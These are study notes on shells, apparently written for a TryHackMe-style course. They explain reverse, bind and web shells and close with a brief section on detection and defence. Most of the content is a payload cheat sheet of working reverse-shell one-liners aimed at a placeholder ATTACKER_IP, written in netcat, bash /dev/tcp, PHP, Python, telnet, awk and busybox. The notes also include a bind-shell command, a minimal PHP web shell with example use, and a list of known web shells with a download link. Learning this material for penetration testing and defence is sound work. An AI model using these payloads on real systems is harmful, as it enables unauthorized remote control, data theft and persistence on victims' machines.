# Shells - Comprehensive Notes

## 1. What is a Shell?

### Basic Definition
- **Shell**: Software that allows user interaction with an operating system
- **Types**: 
  - Graphical Interface (GUI)
  - Command-Line Interface (CLI) - most common in cybersecurity

### Cybersecurity Context
- **Shell Access**: Session an attacker establishes on a compromised system
- **Purpose**: Execute commands and run software on target system

### Attack Activities Enabled by Shell Access
| Activity | Description |
|----------|-------------|
| **Remote System Control** | Execute commands/software remotely on target |
| **Privilege Escalation** | Elevate from limited to administrative access |
| **Data Exfiltration** | Read and copy sensitive data from system |
| **Persistence** | Maintain access through backdoors/hidden accounts |
| **Post-Exploitation** | Deploy malware, create accounts, delete information |
| **Network Pivoting** | Use compromised system to access other network systems |

---

## 2. Reverse Shells

### Concept
- **Reverse Shell**: "Connect back" technique where target initiates connection to attacker
- **Advantage**: Bypasses firewalls by appearing as outgoing traffic from target

### How Reverse Shells Work

#### Step 1: Attacker Sets Up Listener
```bash
# Basic Netcat listener
attacker@kali:~$ nc -lvnp 443

# Flags explanation:
# -l: Listen mode
# -v: Verbose output  
# -n: No DNS resolution
# -p: Specify port (443, 80, 53, 445 commonly used)
```

#### Step 2: Execute Payload on Target
```bash
# Named pipe reverse shell payload
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

**Payload Breakdown:**
1. `rm -f /tmp/f` - Remove existing named pipe
2. `mkfifo /tmp/f` - Create new named pipe for bidirectional communication
3. `cat /tmp/f | sh -i 2>&1` - Read pipe and pipe to interactive shell
4. `nc ATTACKER_IP 443 >/tmp/f` - Send output back through pipe to Netcat

#### Step 3: Attacker Receives Shell
```
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$
```

---

## 3. Bind Shells

### Concept
- **Bind Shell**: Binds to port on compromised system and listens for attacker connection
- **Use Case**: When target restricts outgoing connections
- **Disadvantage**: Easier to detect (listening service)

### How Bind Shells Work

#### Step 1: Set Up Bind Shell on Target
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Payload Breakdown:**
- Similar to reverse shell but uses `nc -l` to listen on target
- `0.0.0.0` listens on all interfaces
- Port 8080+ avoids needing root privileges

#### Step 2: Attacker Connects to Target
```bash
attacker@kali:~$ nc -nv TARGET_IP 8080
```

---

## 4. Listener Tools

### Enhanced Netcat Listeners

#### Rlwrap (Readline Wrapper)
```bash
# Enables arrow keys and command history
attacker@kali:~$ rlwrap nc -lvnp 443
```

#### Ncat (NMAP Enhanced Netcat)
```bash
# Basic listener
attacker@kali:~$ ncat -lvnp 4444

# SSL encrypted listener
attacker@kali:~$ ncat --ssl -lvnp 4444
```

#### Socat (Socket Cat)
```bash
# Basic TCP listener
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT

# Flags:
# -d -d: Double verbose mode
# TCP-LISTEN:443: Listen on port 443
# STDOUT: Output to terminal
```

---

## 5. Shell Payloads

### Bash Payloads

#### Standard Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

#### Read Line Reverse Shell
```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

#### File Descriptor Based
```bash
# Using FD 196
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196

# Using FD 5  
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

### PHP Payloads

#### Different Function Approaches
```php
# exec() function
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'

# shell_exec() function  
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'

# system() function
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

# passthru() function
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'

# popen() function
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

### Python Payloads

#### Environment Variable Method
```bash
export RHOST="ATTACKER_IP"; export RPORT=443; 
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

#### Subprocess Method
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

#### Short Version
```python
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### Other Payloads

#### Telnet
```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

#### AWK
```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

#### BusyBox
```bash
busybox nc ATTACKER_IP 443 -e sh
```

---

## 6. Web Shells

### Concept
- **Web Shell**: Script executed through web server that provides command execution
- **Languages**: PHP, ASP, JSP, CGI scripts
- **Deployment**: Upload via vulnerabilities or unauthorized access

### Basic PHP Web Shell Example
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Usage:**
- Upload to web server as `shell.php`
- Access via: `http://victim.com/shell.php?cmd=whoami`
- Executes `whoami` command and displays output

### Popular Web Shells

#### p0wny-shell
- Minimalistic single-file PHP web shell
- Provides terminal-like interface in browser

#### b374k shell  
- Feature-rich PHP web shell
- File management capabilities
- Command execution interface

#### c99 shell
- Robust PHP web shell
- Extensive functionality suite
- Advanced file manipulation

**Resource**: More web shells available at https://www.r57shell.net/

---

## Key Differences Summary

| Aspect | Reverse Shell | Bind Shell |
|--------|---------------|------------|
| **Connection Direction** | Target → Attacker | Attacker → Target |
| **Firewall Bypass** | Better (outbound traffic) | Worse (inbound traffic) |
| **Detection Risk** | Lower | Higher (listening service) |
| **Use Case** | Most common | Restricted outbound connections |

---

## Defense Considerations

### Detection Signs
- Unusual outbound connections (reverse shells)
- Unexpected listening services (bind shells)  
- Suspicious web files (web shells)
- Abnormal process behavior

### Protection Strategies
- Network monitoring for suspicious connections
- File integrity monitoring on web directories
- Least privilege principle for service accounts
- Regular vulnerability assessments
